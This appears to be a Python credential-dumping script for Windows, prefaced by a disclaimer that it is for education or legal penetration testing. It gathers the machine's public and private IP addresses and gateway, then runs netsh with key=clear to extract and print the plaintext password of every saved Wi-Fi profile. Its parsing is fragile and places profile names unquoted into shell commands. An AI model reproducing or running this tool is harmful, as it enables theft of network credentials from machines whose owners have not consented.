import socket
import os
import netifaces
from requests import get

print("#"*100)
print("     Author: Tal Sperling")
print("     This code is to be used for educational purposes or legal penetration testing only")
print("     I do not take responsibility for any misuse or illegal action/use of this code")
print("#"*100+"\n")

public_ip_address = get('https://api.ipify.org').content.decode('utf8')

#get the I.P. address and MAC address for the default gateway
default_gateway = netifaces.gateways()["default"]

#get the I.P. address of the machine running the script
ip_address = socket.gethostbyname(socket.gethostname())

print("Public I.P. address: {0}\nPrivate I.P. address: {1}\nDefault gateway: {2}\n".format(public_ip_address,ip_address,default_gateway))

print("**** Reading Wifi Data ****\n")

#get all profile names of wifi
command_output = os.popen("netsh wlan show profiles").read()

#get index of the first profile name
start = command_output.index("All User Profile")

#remove everything before the first profile name
splt_lst = command_output[142:]

profile_names = list()
data = list()

#split the command_output string into a list of each line in the string
splt_lst = splt_lst.split("\n")
splt_lst = splt_lst[:-2]

#Itterate through the list above and find the profile name. Append the profile name into the profile_names list
for name in splt_lst:
    splt = name.split(":")
    profile_name = splt[1]
    profile_names.append(profile_name)

for name in profile_names:
    command_output = os.popen("netsh wlan show profile {} key=clear".format(name)).read()
    #get index of the Security key
    try:
        start = command_output.index("Security key")

        # Get the Security key line
        splt_lst = command_output[start:start + 34]
        splt_lst = splt_lst.split(":")

        if "Present" in splt_lst[1]:

            start = command_output.index("Key Content")

            #get Key Content line
            splt_lst = command_output[start:]
            splt_lst = splt_lst.split("\n")
            splt_lst = splt_lst[0].split(":")
            password = splt_lst[1][:-2]

            password = {"ssid":name,"password":password}
            data.append(password)

    except:
        continue



for line in data:
    print("Wifi SSID: {0} \n Password: {1}".format(line["ssid"], line["password"]))
    print("\n")